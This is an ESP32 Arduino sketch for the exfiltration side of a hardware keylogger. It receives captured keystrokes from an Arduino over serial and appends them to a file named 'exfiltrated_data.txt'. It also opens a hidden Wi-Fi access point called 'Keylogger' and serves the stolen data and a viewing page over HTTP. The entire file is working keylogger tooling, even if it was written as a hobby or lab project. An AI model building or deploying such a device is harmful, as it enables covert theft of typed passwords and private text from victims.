
// Load Libraries
#include <WiFi.h>
#include "ESPAsyncWebServer.h"
#include <SPIFFS.h>

// Pin (Reader) of the serial communication with arduino.
#define RXp2 16

// Network informations
const char* ssid     = "Keylogger"; // SSID of the Access Point
const char* password = "123456789"; // Password of the Access Point
const int channel_number = 13; // Channel on which the wifi is spreaded
const int hidden_ssid = 1; //The SSID is hidden when the value is equal to 1.
const int maximum_connection = 1; // The maximum number of client that can be connected at the same time to the Access Point

// Path to data file
const char* path = "/exfiltrated_data.txt";

// Set asynchronous web server port number to 80
AsyncWebServer server(80);

// Function to Write exfiltrated data to a file stored on SPIFSS
void writeFile(const char * path, String message){
    Serial.printf("Writing file: %s\r\n", path);
    // Open the file with the mode FILE_APPEND to add data and not to erase all before writing in it
    File exfiltrated_data_file = SPIFFS.open(path, FILE_APPEND);
    if(!exfiltrated_data_file){
        Serial.println("- failed to open file for writing");
        return;
    }
    if(exfiltrated_data_file.print(message)){
        Serial.println("- file written");
    } else {
        Serial.println("- write failed");
    }
    exfiltrated_data_file.close();
}


void setup() {
  // Definition of the serial port/rate
  Serial.begin(115200);
  Serial2.begin(9600, SERIAL_8N1, RXp2);
  
  
  // Connect to Wi-Fi network with variables defined before
  Serial.print("Setting AP (Access Point)…");
  WiFi.softAP(ssid, password,channel_number,hidden_ssid,maximum_connection);

  //Access point specification about IP address
  
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  //Verification to be sure that the SPIFFS is correclty started
  if (!SPIFFS.begin(true)) {
    Serial.println("An error has occurred while mounting SPIFFS");
    return;
  }else{
    Serial.println("Correctly mounting SPIFFS");
  }

  // Definition of the routes used by the webserver
  
  // Route for root / web page
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.html");
  });
  
  // Route to load style.css file
  server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/style.css", "text/css");
  });
  // Route to load index.js file
  server.on("/index.js", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.js");
  });
  // Route to load jspdf library
  server.on("/jspdf.js", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/jspdf.js");
  });
  // Route to load html2canvas library
  server.on("/html2canvas.js", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/html2canvas.js");
  });
  // Route to load the keylogger image (png)
  server.on("/keylogger.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keylogger.png");
  });
  // Route to load exfiltrated data on the webserver
  server.on("/getData", HTTP_GET, [](AsyncWebServerRequest *request)
  {
    request->send(SPIFFS, "/exfiltrated_data.txt");
  });
  
  server.begin();
}

void loop(){
  // If something is transmitted to the ESP through serial, then write it to the file
  if(Serial2.available()){
    writeFile(path,Serial2.readString());
  }
}
